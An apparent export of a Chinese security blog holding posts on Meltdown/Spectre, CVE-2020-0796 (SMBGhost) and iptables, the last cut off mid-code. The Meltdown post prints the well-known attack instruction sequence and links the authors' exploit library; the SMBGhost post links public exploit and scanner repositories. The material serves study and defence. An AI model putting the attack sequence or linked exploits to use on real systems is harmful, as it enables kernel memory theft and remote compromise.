漏洞原理</h2><p>计算机操作系统有一个最基本的安全目标：保证用户程序不能任意访问内核/其他用户程序的内存。一旦某个恶意应用可以任意访问其他应用程序/操作系统的内存，那么后果则不堪设想。</p><p>为了实现这个目标，操作系统和计算机硬件（CPU）采取了以下措施：</p><ul><li>操作系统：通过虚拟内存为每个应用程序和内核开辟独立的地址空间，规定相应的访问权限。</li><li>CPU：通过硬件实现支持虚拟内存（TLB）及其相应的访问权限。</li></ul><p>举例来讲，如果有一个用户程序试图访问一个内核的内存地址，那么在CPU执行相应指令的过程中会探测到没有访问权限，进而触发中断/异常，导致程序终结。</p><p>所以一般情况下，除非恶意程序通过软件漏洞提权获得了内核权限，否则是无论如何也绕不过CPU 的权限检查从而能访问内核地址的。</p><p>具体来看，假设非法访问内存的指令为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax  byte[x]  <span class="comment">// 将内核地址x处的内容存到寄存器rax</span></span><br></pre></td></tr></table></figure><p>操作系统会事先标注好内核的内存地址范围，如果 x 在内核的这个地址范围内，并且 CPU 不是以内核模式运行的话，那么该指令会被 CPU 标注为非法，引起异常，异常处理程序会将 <code>rax</code> 清空为0，并且终结此程序，这样后续指令再来读 <code>rax</code> 的时候就只能读到0了。目前看来这一整套流程还是无懈可击的。</p><p>然而这里一个重要的前提假设是：<strong>CPU 在做权限检查并且将 <code>rax</code> 清零的过程中，不会泄露任何关于 [x] 的信息</strong>。</p><p>一般的恶意攻击者，采用的是前一种方法进行攻击：提权，让CPU通过权限检查，然而Meltdown却另辟蹊径，在 <code>rax</code> 寄存器清零的过程中，采用了侧信道攻击获取信息</p><p>Meltdown和Spectre这两个漏洞利用了这个过程，他们来源于芯片厂商为了提高CPU性能而引入的两种特性：乱序执行（Out-of-Order Execution）和预测执行(Speculative Execution)。</p><h4 id="乱序执行和预测执行"><a href="#乱序执行和预测执行" class="headerlink" title="乱序执行和预测执行"></a>乱序执行和预测执行</h4><h5 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h5><p>简单来说，现代CPU执行效率太高，但是内存访问端的速度跟不上，因此现代处理器为了提高性能并不严格按照指令的顺序串行执行，而是对执行进行相关性分析后并行处理乱序执行。比如当处理器中的某些指令需要等待某些资源，处理器不会真的在这里等待而停止指令的执行，而是利用等待资源的时间继续执行后续的指令。在支持乱序执行的CPU中，后面的指令可能在前面指令执行结束前就开始执行了。（两个漏洞的万恶之源）</p><p>但是为了保证程序运行的正确性，处理器会对指令执行安全检查，只有当前用户权限符合指令权限时才能被执行，比如用户空间的指令访问内核内存处理器就会抛出异常。然而安全检查这个操作只有在指令退休（retirement——一条指令退休只有当它的执行的结果真正被提交并对系统可见时才会发生）时才会进行。也就是说，<strong>如果在乱序执行中，指令并没有真正执行完成而只是加载到缓存中（下文会提）是不会执行安全检查的</strong>。而此时由于乱序执行而被提前执行的指令会被处理器丢弃，但由于乱序执行的指令对缓存的操作在这些指令被丢弃时不会被重置。正是安全检查与乱序执行的空窗期才会让Meltdown有机可乘。</p><h5 id="预测执行"><a href="#预测执行" class="headerlink" title="预测执行"></a>预测执行</h5><p>预测执行涉及到程序的控制流，现在处理器不是去解析所有分支指令后然后决定执行哪个操作，而是预测哪个控制流会更有可能被运行再提取相应的指令代码执行。如果预测正确的话，会带来很高的性能提升并提高处理器的并行性。如果预测错误，那些被预测执行的不正确结果会被丢弃，处理器会将状态恢复到预测执行行前的正确状态，再重新跳转到正确执行的分支或指令中运行。与乱序执行类似，预测执行对处理器缓存的操作会被保留。</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>这种机制从宏观上看似乎没什么问题，但由于处理器的缓存（cache）机制，那些被预测执行或乱序执行的指令会被先加载到缓存中，但在处理器恢复状态时并不会恢复处理器缓存的内容。而最新的研究表明攻击者可以利用缓存进行侧信道攻击，而Meltdown与Spectre从本质上来看属于利用处理器的乱序执行或预测执行漏洞进行的缓存侧信道攻击。</p><blockquote><ul><li><h5 id="缓存侧信道攻击"><a href="#缓存侧信道攻击" class="headerlink" title="缓存侧信道攻击"></a>缓存侧信道攻击</h5></li></ul><p>缓存通过数据共享来加快数据访问，也就是说缓存命中与失效对应的响应时间是有差别的，攻击者正是利用这种时间的差异性来推测缓存中的信息，从而获得隐私数据。缓存侧信道攻击主要有Evict+Time[7]、Prime+Probe[6])与Flush+Reload[5]等攻击方式，这里主要简单介绍一下Flush+Reload，也是下文meltdown的exploit中利用的方法。</p><p>假设攻击者和目标程序共享物理内存（也可以是云中不同虚拟机共享内存），攻击者可以反复利用处理器指令将监控的内存块（某些地址）从缓存中驱逐出去，然后在等待目标程序访问共享内存（Flush阶段）。然后攻击者重新加载监控的内存块并测量读取时间(Reload阶段)，如果该内存块被目标程序访问过，其对应的内存会被导入到处理器缓存中，则攻击者对该内存的访问时间将会较短。通过测量加载时间的长短，攻击者可以清楚地知道该内存块是否被目标程序读取过。</p><p>Meltdown与Spectre利用这种侧信道可以进行越权内存访问，甚至读取整个内核的内存数据。</p></blockquote><h4 id="Meltdown攻击指令序列"><a href="#Meltdown攻击指令序列" class="headerlink" title="Meltdown攻击指令序列"></a>Meltdown攻击指令序列</h4><p>以一个简化的meltdown攻击指令序列为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; rcx = kernel address</span><br><span class="line">; rbx = probe_array</span><br><span class="line">mov rax, byte [rcx]</span><br><span class="line">shl rax, 0xc</span><br><span class="line">mov rbx, qword [rbx + rax]</span><br></pre></td></tr></table></figure><ul><li><p><code>rcx</code>为我们非法访问的内核地址，<code>rcx</code>寄存器存放用户空间程序不可访问的内核地址</p></li><li><p><code>rbx</code>为我们用户空间中的一个数组，<code>rbx</code>寄存器指向探测数组<code>probe_array</code></p></li><li><p><code>mov des src</code>，将<code>src</code>的数据移到<code>des</code>里，第三行的是尝试将内核地址中的一个字节移到<code>rax</code>寄存器中，是一个非法操作。该条指令视图访问内核地址，处理器会对其进行作安全检查，检查该进程是否有权限访问该地址。由于我们是以普通用户去执行的，因此这条指令会触发异常，该指令及之后的指令对寄存器的修改都会被丢弃，这样处理器能够回到正常执行的指令中，但由于处理器采用乱序执行的方式，在等待处理器完成该指令的同时（权限检查结束之前），后两条已经执行了，尽管他们都会被丢弃</p></li><li><p><code>shl des src</code>，将<code>src</code>逻辑左移<code>des</code>位，这里将读到的数据乘以4096（4KB，0xC,正好为x86架构中的一个页的大小4KB）</p></li><li><p>第五行指令将上一条作为索引，对<code>rbx</code>探测数组进行探测，简单来说就是遍历这个数组。理论上讲，执行第四行指令时，<code>rax</code>就应该清零了，但是由于乱序执行，第四行和第五行的指令将会被执行，知道异常处理的时候，将 <code>rbx</code> 和 <code>rax</code> 清零。</p></li></ul><p>目前看起来确实没啥问题，因为<code>rbx</code>也会清零，任何关于内核地址的信息都没有留下来。</p><p>但是问题的关键就在第三行指令：<strong>如果地址 <code>rbx + rax</code> 不在cache中的话，CPU 会自动将这一地址调入cache中，以便之后访问时获得更好的性能，然而异常处理并不会将这个cache flush掉。而这条 cache 的地址是和 <code>rax</code> 直接相关的，这样就相当于在 CPU 硬件中留下了和 <code>rax</code> 相关的信息。</strong></p><p>那么如何还原 <code>rbx + rax</code> 这个被cache的地址呢？这时候需要用到的原理就是利用cache的访问延时，即已经被cache的数据访问时间短，没有被cache的数据访问时间长。由于<code>rbx</code>这个array是在用户地址空间内的，可以自由操作，首先我们要确保整个 <code>rbx</code>这个数组都是没有被cache的，然后执行上述攻击代码，这时候 <code>rbx + rax</code> 这个地址就已经被cache了，接下来遍历整个<code>rbx</code> 探测数组，来测量访问时间，访问时间最短的那个 page 就可以确定为 <code>rbx + rax</code>。（如下图，图来自原论文meltdown）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Meltdown-And-Hardware-Security/rbx+84page_size.jpg" alt></p><p>可以看到访问速度最快的，就是已经被cache到的内核地址空间中的一个字节byte，如此循环，即可获得全部内核空间的数据。</p><p>github中的PoC就是利用<code>sudo cat /proc/kallsyms | grep “linux_proc_banner”</code>获取<code>linux_proc_banner</code>在内核中的地址，再读取该地址上的值，去获取 <code>/proc/version</code> 的内容，证明漏洞存在</p><blockquote><p>至于和meltdown同期的spectre漏洞，和 meltdown 的原理相似，利用分支预测错误的 speculative execution，访问到不该访问的信息，并且同样是通过 cache 这个side channel 传递出去。而且由于利用的分支预测原理普及率非常高，Spectre 的影响面更大一些。</p></blockquote><p>具体的Meltdown的exploit分析可以看这篇文章：<a href="https://www.freebuf.com/articles/system/159811.html#0X02 Exploit 分析" target="_blank" rel="noopener">Meltdown_Exploit分析</a></p><p>我现在只是懂了他为什么这么做，但是我还想懂得他为什么会想到这么做（要去思考1.他做了什么2.他为什么这么做3.他为什么这样想4.忘了哪看到的逻辑层次(绝对不是百度搜出来的那个)</p><p>//TODO</p><p><a href="https://github.com/IAIK/meltdown/tree/master/libkdump" target="_blank" rel="noopener">libkdump</a>这是作者开源出来的exp库，我们可以通过阅读(//TODO：等我对操作系统有着更深层次的理解时，来分析代码)并编译它，或者直接利用他编译后的库来使用</p><h2 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h2><ul><li><p>Linux上现在提出的解决手段是KPTI（通用技术称为Kaiser），内核和用户态不共享页表，每次你异常、IO、系统调用，都要把内核页表重新装进来。<br><a href="https://lwn.net/Articles/738975/" target="_blank" rel="noopener">https://lwn.net/Articles/738975/</a></p></li><li><p>windows已经推送漏洞更新了，在某个系统补丁里0.0</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//以管理员权限打开powershell运行命令</span><br><span class="line">//可以看到提示</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass</span><br><span class="line">Install-Module SpeculationControl</span><br><span class="line">Get-SpeculationControlSettings</span><br></pre></td></tr></table></figure></li></ul><p>其余可参见文章：<a href="https://www.freebuf.com/articles/system/159577.html" target="_blank" rel="noopener">史上最大CPU漏洞Meltdown &amp; Spectre 影响与修复指南</a></p><h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>Meltdown与Spectre本质上都是基于缓存侧信道的攻击。</p><p><strong>Meltdown与Spectre主要用于信息泄露</strong>，并不能对目标内存地址进行任意修改。攻击者必须要有执行权限才能进行攻击，对于一般用户只要不被执行恶意代码（比如访问恶意网站），就不会被Meltdown与Spectre攻击。但是在云端，攻击者可以租赁虚拟机来执行攻击者想要执行的任意代码，从而获取宿主物理机以及其它租户的信息，这对云服务商的冲击还是非常大的。</p><blockquote><p>文中关于exp的思考问题：</p><h3 id="值得进一步思考的问题"><a href="#值得进一步思考的问题" class="headerlink" title="值得进一步思考的问题"></a>值得进一步思考的问题</h3><blockquote><ol><li><p>该利用代码一次只能探测一个字节的数据，如果在内核数据还没读取完整之前处理器已经处理异常了该怎么办？<br>个人认为：觉得应该可以多次探测，不是每次都能这么快处理异常的</p></li><li><p>探测数组target_array是否可以不用设置成256*4KB，设置成512*2KB，1024*1KB效果会如何？<br>个人认为：应该是可以的，但是感觉效率没有256 * 4KB的效率高</p></li><li><p>探测数组target_array是个大数组，占用多个内存页面，是否容易被检测到？<br>个人认为：应该是不容易被检测到的，切换页面也需要时间，占多个页面导致效率大大降低</p></li></ol></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> Hardware </category>
          
          <category> Security </category>
          
          <category> CPU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796</title>
      <link href="/2020/03/16/CVE-2020-0796/"/>
      <url>/2020/03/16/CVE-2020-0796/</url>
      
        <content type="html"><![CDATA[<blockquote><p>details about new SMB wormable bug leak:</p><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005" target="_blank" rel="noopener">ADV200005 | Microsoft Guidance for Disabling SMBv3 Compression</a></p><p><a href="https://www.zdnet.com/article/microsoft-patches-smbv3-wormable-bug-that-leaked-earlier-this-week/" target="_blank" rel="noopener">Microsoft patches SMBv3 wormable bug that leaked earlier this week</a></p><p>CVE-2020-0796相关信息（smbv3漏洞检测工具）：</p><p><a href="https://gist.github.com/nikallass/40f3215e6294e94cde78ca60dbe07394" target="_blank" rel="noopener">nikallass / check-smb-v3.11.sh</a> ：linux下的检测脚本</p><p><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">Scanner for CVE-2020-0796 - SMBv3 RCE</a> ： 基于python3的检测脚本</p><p><a href="https://vimeo.com/397149983" target="_blank" rel="noopener">vimeo 视频演示</a></p><p>CVE-2020-0796相关分析信息：</p><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/smbghost-analysis-of-cve-2020-0796" target="_blank" rel="noopener">SMBGhost – Analysis of CVE-2020-0796</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html" target="_blank" rel="noopener">微软SMBv3客户端/服务端远程代码执行漏洞（CVE-2020-0796）技术分析</a></p><p>CVE-2020-0796-PoC：</p><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">PoC for triggering buffer overflow via CVE-2020-0796</a></p><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">CVE-2020-0796 - Windows SMBv3 LPE exploit #SMBGhost</a></p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>PoC报告可以看这个<a href="CVE-2020-0796/mswinsmb3-exec.txt">文档</a> ，虽然Windows defender没有直接删除，但是当内容保存时，提示我需要发到远端服务器判断，看来windows defender还是挺靠谱的</p><p><del>3.12爆出的漏洞，3.18公布exp</del></p><blockquote><p>windows SMB 3使用说明：</p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/storage/file-server/file-server-smb-overview" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/storage/file-server/file-server-smb-overview</a></p></blockquote><h3 id="受影响的系统"><a href="#受影响的系统" class="headerlink" title="受影响的系统"></a>受影响的系统</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1903</span> for <span class="number">32</span>-bit Systems</span><br><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1903</span> for ARM64-based Systems</span><br><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1903</span> for x64-based Systems</span><br><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1909</span> for <span class="number">32</span>-bit Systems</span><br><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1909</span> for ARM64-based Systems</span><br><span class="line">+ Windows <span class="number">10</span> Version <span class="number">1909</span> for x64-based Systems</span><br><span class="line">+ Windows Server, version <span class="number">1903</span> (Server Core installation)</span><br><span class="line">+ Windows Server, version <span class="number">1909</span> (Server Core installation)</span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><img src="/2020/03/16/CVE-2020-0796/" alt></p><ul><li>检查本地计算机上的活动SMB连接版本（Windows 8及更高版本）<ul><li>Powershell.exe-&gt; Get-SMBConnection<br>这仅显示当前打开的SMB连接 </li></ul></li><li>Nmap扫描以检查支持的SMB协议版本<br><code>nmap -p445 --script smb-protocols &lt;目标主机/子网&gt; | grep -P&#39;\ d + \。\ d + \。\ d + \。\ d + | ^ \ |。\ s + 3.11&#39;</code></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables</title>
      <link href="/2020/03/16/iptables/"/>
      <url>/2020/03/16/iptables/</url>
      
        <content type="html"><![CDATA[<h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a><center>iptables</center></h1><blockquote><p>参考：</p><p><a href="https://linux.die.net/man/8/iptables" target="_blank" rel="noopener">iptables - Linux man page</a></p><p><a href="https://www.jianshu.com/p/6af4eb08eac2" target="_blank" rel="noopener">iptables_command</a></p><p><a href="https://www.xiebruce.top/1071.html" target="_blank" rel="noopener">iptables详解</a></p><p><a href="https://www.zsythink.net/archives/1199" target="_blank" rel="noopener">iptables详解</a></p><p><a href="https://www.jianshu.com/p/ee4ee15d3658" target="_blank" rel="noopener">iptables详解及一些常用规则</a></p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p><p>iptables分为2部分，一部分位于内核中，用来存放规则，称为NetFilter。还有一段在用户空间中，用来定义规则，并将规则传递到内核中，这段在用户空间中的程序就叫做iptables。 所以对于用户空间来说，就是按照需要生成一条条规则，然后向内核中提交，存放到NetFilter，让这些规则在数据传输与处理的过程中起作用。形象化地理解来说就是，把iptables看作是一个客户端代理，用户通过iptables这个代理，与内核中的安全框架netfilter进行交互。netfilter才是防火墙真正的安全框架，处于内核空间内。</p><p>Netfilter是linux操作系统核心层内部的一个数据包处理模块，拥有如下功能：</p><ul><li>网络地址转换(Network Address Translate)</li><li>数据包内容修改</li><li>数据包过滤的防火墙功能</li></ul><h4 id="链"><a href="#链" class="headerlink" title="链"></a>链</h4><p>iptables开启后，数据报文从进入服务器到出来经过5条链，分别为 <code>prerouting</code> 、 <code>input</code> 、<code>output</code> 、 <code>forward</code> 、 <code>postrouting</code></p><p>如下图，即数据报文的可能经过的路径</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/1.jpg" alt></p><p>每条链上设有多种规则，数据报文必须按照顺序一个个匹配这些规则</p><p>正如图中，数据报文经过的5条链上，必须逐一经过每一条链，而在链上，数据报文必须逐一通过(符合)每一个规则的限制，方能到下一条链上</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/2.jpg" alt></p><ul><li><strong>INPUT链</strong>：当接收到防火墙本机地址的数据包(入站)时，应用此链的规则</li><li><strong>OUTPUT链</strong>：当防火墙本机向外发送数据包(出站)时，应用此链的规则</li><li><strong>FORWARD链</strong>：当接收到需要通过防火墙发送给其他地址的数据包(转发)时，应用此链的规则</li><li><strong>PREROUTING链</strong>：在对数据包作路由选择之前，应用此链的规则，如DNAT</li><li><strong>POSTROUTING链</strong>：在对数据包作路由选择之后，应用此链的规则，如SNAT</li></ul><p>在链的第一张图中，我们可以形象地看出数据包在哪些条件下需要经过哪些链</p><p>input和output链更多应用在主机防火墙中，主要针对本机进出的数据安全控制，而prerouting、postrouting、forward链更多应用在网络防火墙中，特别是防火墙服务器作为网关时使用的情况</p><h4 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h4><p>虽然一条链上有多条规则，但是基于某些规则的作用功能很相似，因此有多个相似功能的规则组成了表，iptables为我们提供了四种表</p><ul><li><strong>filter表</strong>：主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包(如<code>DROP</code>、<code>ACCEPT</code> 、<code>REJECT</code> 、 <code>LOG</code> )，所谓防火墙其实基本上是指这张表上的过滤规则，对应内核模块的<code>iptables_filter</code></li><li><strong>nat表</strong>：Network Address Translation，网络地址转换功能，主要用于修改数据包的ip地址、端口号信息等 ( 如 <code>SNAT</code> 、 <code>DNAT</code> 、 <code>MASQUERADE</code> 、<code>REDIRECT</code> )。属于一个流的包只会经过这个表一次，如果第一个包被允许做NAT或Masqueraded，那么余下的包都会自动做相同的操作，对应内核模块的<code>iptables_nat</code> </li><li><strong>mangle表</strong>：拆解报文，做出修改，并重新封装，主要用于修改数据包的TOS(Type of Service，服务类型)、TTL( Time To Live，生存周期)以及为数据包设置Mark标记，以实现QoS(Quality Of Service ，服务质量)调整以及策略路由等应用，由于需要相应的路由设备支持，因此应用并不广泛，对应内核模块<code>iptables_mangle</code></li><li><strong>raw表</strong>：从iptables 1.2.9版本后新添加的表，主要用于决定数据包是否被状态跟踪机制处理，在匹配数据包时，raw表规则要有优先于其他表，对应内核模块<code>iptables_raw</code></li></ul><p>我们自定义的所有规则，都会添加到四张表中的其中一张表中</p><p>规则表之间的优先顺序：Raw &gt;&gt; mangle &gt;&gt; nat &gt;&gt; filter</p><h4 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h4><p>5条链中，并不是每条链都能应用所有类型的表，事实上除了Output链上能同时拥有四种表以外，其他都只能有两到三种表</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/3.jpg" alt></p><p>上图即为每种链能应用的表，实际上，在各表中还有匹配顺序，每条链上的各个表的匹配顺序为：<br><strong>raw &rarr; mangle &rarr; nat &rarr; filter</strong></p><p>把上图转换成表，可直观地看出来，表链的关系</p><table><thead><tr><th></th><th>raw</th><th>mangle</th><th>nat</th><th>filter</th></tr></thead><tbody><tr><td>prerouting</td><td>1</td><td>1</td><td>1</td><td>0</td></tr><tr><td>input</td><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>forward</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td>output</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>postrouting</td><td>0</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>数据包通过防火墙流程可以总结如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/4.jpg" alt></p><h4 id="规则的概念"><a href="#规则的概念" class="headerlink" title="规则的概念"></a>规则的概念</h4><p>iptables规则主要包含了“条件&amp;动作”，即匹配出符合什么条件(规则)后，对它采取怎样的动作</p><h5 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h5><ul><li><strong>S_IP</strong>：source ip，即源ip</li><li><strong>S_PORT</strong>：source port，源端口</li><li><strong>D_IP</strong>：destination ip，目标ip</li><li><strong>D_PORT</strong>：destination port，目标端口</li><li><strong>TCP/UDP</strong>：第四层协议(传输层)</li></ul><h5 id="处理的动作"><a href="#处理的动作" class="headerlink" title="处理的动作"></a>处理的动作</h5><ul><li><strong>ACCEPT</strong>：允许数据包通过</li><li><strong>DROP</strong>：直接丢弃数据包，不回应任何信息，客户端只有当该链超时后才会有反应</li><li><strong>REJECT</strong>：拒绝数据包，会给客户端发送一个数据包被丢弃的相应信息</li><li><strong>SNAT</strong>：S指Source，源NAT（源地址转换），再进入路由层面的route之后，出本地的网络线之前，改写源地址，目标地址不变，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去的源地址，并发给主机，解决私网用户用同一个公网ip上网的问题</li><li><strong>MASQUERADE</strong>：是SNAT的一种特殊形式，适用于动态的、临时会变的IP上；</li><li><strong>DNAT</strong>：D指Destination，目的NAT，解决私网服务端，接收公网请求的问题。和SNAT相反，IP包经过route之前，重新修改目标地址，源地址不变，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机。可以隐藏后端服务器的真实地址</li><li><strong>REDIRECT</strong>：在本机做端口映射；</li><li><strong>LOG</strong>：在<code>/var/log/messages</code>文件中记录日志信息，然后将数据包传递给下一条规则</li></ul><p>除去最后一个LOG，前三条规则匹配数据包后，该数据包就不会再往下继续匹配了，所以编写规则的顺序极其关键</p><blockquote><p>关于DNAT和SNAT：</p><p><a href="https://blog.51cto.com/sxj007/110924" target="_blank" rel="noopener">https://blog.51cto.com/sxj007/110924</a></p><p>简单来说，SNAT是替换接收到的数据包的源地址，一般用在postrouting</p><p>而DNAT是替换数据包中的目的地址，一般用在prerouting</p></blockquote><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>有关 <code>iptables</code> 的命令可以用下图来解释</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iptables [-t table_name] <span class="built_in">command</span> [chain_name] [parameter] [-j target&amp;action]</span><br></pre></td></tr></table></figure><p><code>parameter</code> 是用于条件匹配</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/iptables_command.jpg" alt></p><ul><li><p>所有表名必须小写<br> <code>filter</code> / <code>nat</code> / <code>mangle</code> / <code>raw</code></p></li><li><p>所有链名必须大写<br> <code>INPUT</code> / <code>OUTPUT</code> / <code>FORWARD</code> / <code>PREROUTING</code> / <code>POSTROUTING</code></p></li><li><p>所有匹配必须小写<br> <code>-s</code> / <code>-d</code> / <code>-m &lt;module_name&gt;</code> / <code>-p</code></p></li><li><p>所有动作必须大写<br> <code>ACCEPT</code> / <code>DROP</code> / <code>SNAT</code> / <code>DNAT</code> / <code>MASQUERADE</code></p></li></ul><p><strong>对于parameter条件匹配</strong>，如下图所示：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/iptables_parameter.jpg" alt></p><h5 id="对于Command选项："><a href="#对于Command选项：" class="headerlink" title="对于Command选项："></a>对于Command选项：</h5><p><code>-A</code> 在指定链末尾添加(append)一条新规则</p><p><code>-D</code> 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除</p><p><code>-I</code> 在指定链中插入（insert）一条新的规则，默认在第一行添加</p><p><code>-R</code> 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换</p><p><code>-L</code> 列出（list）指定链中所有的规则进行查看</p><p><code>-E</code> 重命名用户定义的链，不改变链本身</p><p><code>-F</code> 清空（flush）</p><p><code>-N</code> 新建（new-chain）一条用户自己定义的规则链</p><p><code>-X</code> 删除指定表中用户自定义的规则链（delete-chain）</p><p><code>-P</code> 设置指定链的默认策略（policy）</p><p><code>-Z</code> 将所有表的所有链的字节和数据包计数器清零</p><p><code>-n</code> 使用数字形式（numeric）显示输出结果</p><p><code>-v</code> 查看规则表详细信息（verbose）的信息</p><p><code>-V</code> 查看版本(version)</p><p><code>-h</code> 获取帮助（help）</p><blockquote><p>打开linux转发功能：<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p></blockquote><p>删除input链的第一条规则：<code>iptables -D INPUT 1</code></p><h4 id="iptables防火墙常用的策略"><a href="#iptables防火墙常用的策略" class="headerlink" title="iptables防火墙常用的策略"></a>iptables防火墙常用的策略</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.拒绝进入防火墙的所有ICMP协议数据包</span></span><br><span class="line">$ iptables -I INPUT -p icmp -j REJECT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.允许防火墙转发除ICMP协议以外的所有数据包</span></span><br><span class="line"><span class="comment"># 说明：使用“！”可以将条件取反。</span></span><br><span class="line">$ iptables -A FORWARD -p ! icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据</span></span><br><span class="line"><span class="comment"># 说明：注意要把拒绝的放在前面,不然拒绝语句就没有用了就不起作用了啊。</span></span><br><span class="line">$ iptables -A FORWARD -s 192.168.1.11 -j REJECT</span><br><span class="line">$ iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT</span><br><span 